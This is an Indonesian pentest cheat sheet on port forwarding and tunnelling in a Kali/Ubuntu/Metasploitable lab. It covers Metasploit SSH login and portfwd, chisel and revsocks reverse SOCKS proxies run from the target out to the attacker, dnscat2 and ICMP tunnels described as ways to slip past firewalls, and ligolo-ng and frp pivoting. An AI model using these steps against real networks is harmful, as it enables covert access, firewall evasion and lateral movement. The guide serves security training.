# Port Forwarding & Tunnelling

> Hanya sebagai referensi
> 
> *Sumber: IGNITE Technologies — hackingarticles.in*

---

## Daftar Isi

- [Port Forwarding](#port-forwarding)
  - [Metasploit portfwd](#1-metasploit-portfwd)
  - [SSH Local Port Forwarding](#2-ssh-local-port-forwarding)
  - [Socat](#3-socat)
- [Tunnelling](#tunnelling)
  - [Sshuttle](#1-sshuttle)
  - [Chisel (Reverse TCP)](#2-chisel-reverse-tcp)
  - [Chisel + SOCKS5](#3-chisel--socks5)
  - [Rpivot (SOCKS4)](#4-rpivot-socks4)
  - [Dynamic SSH (SOCKS5)](#5-dynamic-ssh-tunneling)
  - [Local SSH Tunneling](#6-local-ssh-tunneling)
  - [Plink.exe – Local](#7-plinkexe--local-ssh-tunneling-windows)
  - [Plink.exe – Dynamic](#8-plinkexe--dynamic-ssh-tunneling-windows)
  - [Revsocks](#9-revsocks)
  - [Metasploit SOCKS5](#10-metasploit-socks5)
  - [Metasploit SOCKS4a](#11-metasploit-socks4a)
  - [DNScat2 – Port 22](#12-dnscat2--port-22)
  - [DNScat2 – Port 80](#13-dnscat2--port-80)
  - [ICMP Tunneling](#14-icmp-tunneling)
- [Tambahan: Tools Modern](#tambahan-tools-modern)
  - [Webrelay.dev (Gratis, No CC)](#webrelayde-gratis-no-cc)
  - [Ligolo-ng](#ligolo-ng)
  - [Bore](#bore)
  - [Ngrok](#ngrok)
  - [Cloudflared (Zero Trust Tunnel)](#cloudflared-zero-trust-tunnel)
  - [Frp (Fast Reverse Proxy)](#frp-fast-reverse-proxy)
  - [Proxychains](#proxychains-pendamping-wajib)
- [Referensi Cepat Proxy Browser](#referensi-cepat-proxy-browser)

---

## Port Forwarding

Port forwarding adalah aturan di router yang meneruskan lalu lintas data dari internet (luar) langsung ke perangkat tertentu di jaringan lokal (dalam) berdasarkan nomor port-nya. Tujuannya agar perangkat di jaringan lokal (seperti server game, CCTV, atau website) bisa diakses dari internet.

### 1. Metasploit portfwd

```bash
# Di Kali — login SSH ke Ubuntu via Metasploit
msfconsole
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.1.108
set username raj
set password 123
exploit

sessions -u 1      # Upgrade ke meterpreter
sessions 2
netstat -antp      # Konfirmasi port 8080 di localhost Ubuntu

# Forward port 8080 Ubuntu ke port 8081 Kali
portfwd add -l 8081 -p 8080 -r 127.0.0.1
```

Akses di Kali: `http://127.0.0.1:8081`

---

### 2. SSH Local Port Forwarding

```bash
# Di Kali
ssh -L 8081:localhost:8080 -N -f -l raj 192.168.1.108
```

| Flag | Fungsi |
|------|--------|
| `-L 8081:localhost:8080` | Forward port lokal 8081 ke remote 8080 |
| `-N` | Tidak eksekusi command, hanya forward |
| `-f` | Background mode |
| `-l raj` | Username |

Akses di Kali: `http://127.0.0.1:8081`

---

### 3. Socat

```bash
# Di Ubuntu — redirect semua koneksi ke 127.0.0.1:8080 via port 1234
socat TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:8080 &
```

Akses di Kali: `http://192.168.1.108:1234`

---

## Tunnelling

Ini seperti membuat terowongan terenkripsi di dalam jaringan publik, seringkali untuk menyelundupkan data atau mengakses layanan yang diblokir.

Cara kerja: Komputer membuat koneksi aman ke server di internet. Lalu, semua data dari aplikasi dikirim lewat terowongan ini dan keluar dari server tersebut, bukan dari koneksi internet langsung.

### 1. Sshuttle

Buat VPN-like tunnel melalui SSH. Tidak perlu install agen di remote.

```bash
# Di Kali
apt install sshuttle

# Tunnel ke subnet Metasploitable 2 via Ubuntu
sshuttle -r raj@192.168.1.108 192.168.226.0/24
```

Setelah connect, akses langsung: `http://192.168.226.129` dari browser Kali.

**Seluruh subnet**:
```bash
sshuttle -r raj@192.168.1.108 0.0.0.0/0 --exclude 192.168.1.0/24
```

---

### 2. Chisel (Reverse TCP)

**Kali (server)**:
```bash
git clone https://github.com/jpillora/chisel.git
apt install golang
cd chisel
go build -ldflags="-s -w"

./chisel server -p 8000 --reverse
```

**Ubuntu (client)**:
```bash
git clone https://github.com/jpillora/chisel.git
apt install golang
cd chisel
go build -ldflags="-s -w"

# Forward port 80 Metasploitable 2 ke port 5000 Kali
./chisel client 192.168.1.2:8000 R:5000:192.168.226.129:80
```

Akses di Kali: `http://127.0.0.1:5000`

**Binary prebuilt** (tanpa compile):
```bash
# Download dari releases
curl -L https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz | gunzip > chisel
chmod +x chisel
```

---

### 3. Chisel + SOCKS5

**Kali (server)**:
```bash
./chisel server -p 8000 --reverse
```

**Ubuntu (client — buat SOCKS5 listener di Kali port 1080)**:
```bash
./chisel client 192.168.1.2:8000 R:socks
```

**Ubuntu (opsional — SOCKS5 via Metasploitable 2)**:
```bash
./chisel client 192.168.1.2:8000 R:8001:192.168.226.129:9001
./chisel server -p 9001 --socks5
```

**Konfigurasi browser Kali**:
```
SOCKS Host : 127.0.0.1
Port       : 1080
Tipe       : SOCKS5
No proxy   : 127.0.0.1
```

---

### 4. Rpivot (SOCKS4)

Reverse SOCKS4 proxy. Arah kebalikan dari SSH dynamic forwarding.

**Kali (server)**:
```bash
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
python server.py --server-port 9999 --server-ip 192.168.1.2 --proxy-ip 127.0.0.1 --proxy-port 1080
```

**Ubuntu (client)**:
```bash
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
python client.py --server-ip 192.168.1.2 --server-port 9999
```

**Konfigurasi browser Kali**:
```
SOCKS Host : 127.0.0.1
Port       : 1080
Tipe       : SOCKS4
No proxy   : 127.0.0.1
```

---

### 5. Dynamic SSH Tunneling

SSH bertindak sebagai SOCKS proxy. Mendukung multi-port secara dinamis.

```bash
# Di Kali
ssh -D 7000 raj@192.168.1.108
```

**Konfigurasi browser Kali**:
```
SOCKS Host : 127.0.0.1
Port       : 7000
Tipe       : SOCKS5
No proxy   : 127.0.0.1
```

**Background mode**:
```bash
ssh -D 7000 -N -f raj@192.168.1.108
```

---

### 6. Local SSH Tunneling

Forward satu port spesifik dari Metasploitable 2 melalui Ubuntu.

```bash
# Di Kali — akses port 80 Metasploitable 2 via Ubuntu, bind ke lokal port 7000
ssh -L 7000:192.168.226.129:80 raj@192.168.1.108
```

Akses di Kali: `http://127.0.0.1:7000`

**Multiple port sekaligus**:
```bash
ssh -L 7000:192.168.226.129:80 -L 7022:192.168.226.129:22 raj@192.168.1.108
```

---

### 7. Plink.exe – Local SSH Tunneling (Windows)

Command-line PuTTY untuk Windows sebagai pengganti `ssh`.

```cmd
plink.exe -L 7000:192.168.226.129:80 raj@192.168.1.108
```

Akses di Windows browser: `http://127.0.0.1:7000`

**Tanpa prompt host key (non-interaktif)**:
```cmd
echo y | plink.exe -L 7000:192.168.226.129:80 raj@192.168.1.108
```

---

### 8. Plink.exe – Dynamic SSH Tunneling (Windows)

```cmd
plink.exe -D 8000 raj@192.168.1.108
```

**Konfigurasi browser Windows**:
```
SOCKS Host : 127.0.0.1
Port       : 8000
Tipe       : SOCKS5
No proxy   : 127.0.0.1
```

---

### 9. Revsocks

Reverse SOCKS5 tunneler. Berguna saat target berada di balik NAT/firewall.

**Windows (listener)**:
```cmd
revsocks_windows_amd64.exe -listen :8443 -socks 0.0.0.0:1080 -pass test
```

**Ubuntu/Linux (connect ke listener)**:
```bash
./revsocks_linux_amd64 -connect 192.168.1.3:8443 -pass test
```

**Konfigurasi browser**:
```
SOCKS Host : 127.0.0.1
Port       : 1080
Tipe       : SOCKS5
No proxy   : 127.0.0.1
```

Download: https://github.com/kost/revsocks/releases

---

### 10. Metasploit SOCKS5

```bash
msfconsole

# Setup session meterpreter (via SSH login)
use auxiliary/scanner/ssh/ssh_login
set rhosts 192.168.1.108
set username raj
set password 123
exploit
sessions -u 1

# Autoroute ke subnet Metasploitable 2
use post/multi/manage/autoroute
set session 2
exploit

# Jalankan SOCKS5 proxy
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set version 5
exploit -j
```

**Konfigurasi browser**:
```
SOCKS Host : 127.0.0.1
Port       : 1080
Tipe       : SOCKS5
```

---

### 11. Metasploit SOCKS4a

```bash
# Lanjutan dari autoroute session di atas
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set version 4a
exploit -j
```

**Konfigurasi browser**:
```
SOCKS Host : 127.0.0.1
Port       : 1080
Tipe       : SOCKS4
```

> **Catatan**: Module `socks4a` dan `socks5` lama sudah deprecated. Gunakan `auxiliary/server/socks_proxy` dan set `VERSION`.

---

### 12. DNScat2 – Port 22

Tunnel data melalui protokol DNS (UDP 53). Efektif melewati firewall yang hanya allow DNS.

**Kali (server)**:
```bash
apt install dnscat2
dnscat2-server
```

**Ubuntu (client)**:
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

./dnscat --dns=server=192.168.1.2,port=53
```

**Di Kali — interaksi session**:
```
dnscat2> session
dnscat2> session -i 1
command (ubuntu) 1> shell
command (ubuntu) 1> session -i 2

# Buat listener — forward port SSH Metasploitable 2
command (ubuntu) 1> listen 127.0.0.1:8888 192.168.226.129:22
```

**Di tab baru Kali**:
```bash
ssh msfadmin@127.0.0.1 -p 8888
```

---

### 13. DNScat2 – Port 80

```
# Lanjutan dari session DNScat2 yang aktif
command (ubuntu) 1> listen 127.0.0.1:9999 192.168.226.129:80
```

Akses di Kali: `http://127.0.0.1:9999`

---

### 14. ICMP Tunneling

Enkapsulasi TCP/SSH di dalam paket ICMP. Berguna saat hanya ICMP yang diizinkan.

**Ubuntu (server/pivot)**:
```bash
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel
make

# Nonaktifkan ICMP echo reply agar kernel tidak membalas sendiri
echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all

./icmptunnel -s &

# Assign IP ke tunnel interface
/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0
```

**Kali (client)**:
```bash
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel
make

echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
./icmptunnel 192.168.1.108 &

/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0
```

**Verifikasi tunnel aktif**:
```bash
ping 10.0.0.1   # Dari Kali ke Ubuntu via ICMP tunnel
```

**SSH melalui ICMP tunnel**:
```bash
ssh raj@10.0.0.1
```

Wireshark akan menunjukkan traffic SSH berjalan di atas ICMP.

---

## Tambahan: Tools Modern

### Webrelay.dev (Gratis, No CC)

Expose port lokal ke internet via relay. Tidak perlu akun, tidak perlu kartu kredit.

```bash
# Install
curl -L https://webrelay.io/get | bash

# Expose HTTP lokal port 8080
relay connect --name myapp 8080

# Output:
# https://myapp.webrelay.io -> localhost:8080
```

**Expose SSH untuk remote access**:
```bash
relay connect --protocol tcp 22
# Output: tcp://randomid.webrelay.io:xxxxx -> localhost:22
```

**Tanpa install (Docker)**:
```bash
docker run -it webrelay/cli connect 8080
```

Dokumentasi: https://webrelay.io/docs

---

### Ligolo-ng

Tunnelling modern tanpa proxychains. Mendukung multi-session dan routing subnet penuh. Performa tinggi, tidak butuh agent berbasis Python/Ruby.

**Download**:
```bash
# Di Kali
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_linux_amd64.tar.gz

# Untuk Ubuntu/target
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
tar xzf ligolo-ng_agent_linux_amd64.tar.gz
```

**Kali (proxy server)**:
```bash
# Buat tun interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

./proxy -selfcert -laddr 0.0.0.0:11601
```

**Ubuntu (agent)**:
```bash
./agent -connect 192.168.1.2:11601 -ignore-cert
```

**Di Kali — console ligolo**:
```
ligolo-ng » session               # Pilih session
[Agent : ubuntu] » ifconfig       # Lihat subnet target
[Agent : ubuntu] » start          # Mulai tunnel

# Di terminal Kali — tambah route
sudo ip route add 192.168.226.0/24 dev ligolo
```

Setelah itu akses `192.168.226.129` langsung dari Kali tanpa proxychains.

---

### Bore

Tunnel TCP sederhana. Self-hosted atau pakai server publik `bore.pub`.

```bash
# Install
cargo install bore-cli
# atau
curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz | tar xz

# Expose port lokal 8080 ke internet (gratis, tanpa akun)
bore local 8080 --to bore.pub

# Output: bore.pub:PORT -> localhost:8080
```

**Self-hosted server**:
```bash
# Di VPS
bore server

# Di client
bore local 8080 --to your-vps.com
```

---

### Ngrok

```bash
# Install
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok

# Konfigurasi token, ambil di dashboard ngrok
ngrok config add-authtoken TOKEN

# Expose HTTP
ngrok http 8080

# Expose TCP (SSH)
ngrok tcp 22
```

> Untuk pakai TCP Butuh kartu kredit

---

### Cloudflared (Zero Trust Tunnel)

Tunnel permanen via Cloudflare. Gratis, tidak butuh IP publik, tidak butuh CC.

```bash
# Install
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
dpkg -i cloudflared-linux-amd64.deb

# Quick tunnel (tanpa akun)
cloudflared tunnel --url http://localhost:8080
# Output: https://random-name.trycloudflare.com

# Tunnel persistent (butuh akun Cloudflare gratis)
cloudflared tunnel login
cloudflared tunnel create mylab
cloudflared tunnel route dns mylab lab.domain.com
cloudflared tunnel run mylab
```

---

### Frp (Fast Reverse Proxy)

Self-hosted reverse proxy. Perlu VPS sebagai server.

**Di VPS (frps.toml)**:
```toml
bindPort = 7000
```

```bash
./frps -c frps.toml
```

**Di target/Ubuntu (frpc.toml)**:
```toml
serverAddr = "VPS_IP"
serverPort = 7000

[[proxies]]
name = "ssh"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
remotePort = 6022

[[proxies]]
name = "web"
type = "tcp"
localIP = "127.0.0.1"
localPort = 8080
remotePort = 6080

[[proxies]]
name = "socks5"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1080
remotePort = 1080
```

```bash
./frpc -c frpc.toml
```

**Di Kali**:
```bash
ssh -p 6022 raj@VPS_IP       # SSH ke Ubuntu via VPS
# atau akses http://VPS_IP:6080
```

---

### Proxychains (Pendamping Wajib)

Jalankan tool apapun melalui SOCKS proxy yang sudah dibuat.

```bash
# Edit config
nano /etc/proxychains4.conf

# Akhir file — sesuaikan dengan proxy yang aktif:
socks5  127.0.0.1 1080    # Chisel / Metasploit SOCKS5
# atau
socks4  127.0.0.1 1080    # Rpivot / SOCKS4a
```

**Penggunaan**:
```bash
proxychains nmap -sT -Pn -p 80,22,443 192.168.226.129
proxychains curl http://192.168.226.129
proxychains ssh msfadmin@192.168.226.129
proxychains firefox &
```

**Dynamic chain (multi-hop)**:
```
# proxychains4.conf
dynamic_chain
proxy_dns

[ProxyList]
socks5  127.0.0.1 1080
socks5  10.0.0.1  1081
```

---

## Referensi Cepat Proxy Browser

| Setup | SOCKS Host | Port | Tipe |
|-------|-----------|------|------|
| Chisel R:socks | 127.0.0.1 | 1080 | SOCKS5 |
| Dynamic SSH | 127.0.0.1 | 7000 | SOCKS5 |
| Rpivot | 127.0.0.1 | 1080 | SOCKS4 |
| Metasploit SOCKS5 | 127.0.0.1 | 1080 | SOCKS5 |
| Metasploit SOCKS4a | 127.0.0.1 | 1080 | SOCKS4 |
| Revsocks | 127.0.0.1 | 1080 | SOCKS5 |
| Plink Dynamic | 127.0.0.1 | 8000 | SOCKS5 |

**"No Proxy for"** selalu isi: `127.0.0.1,localhost`
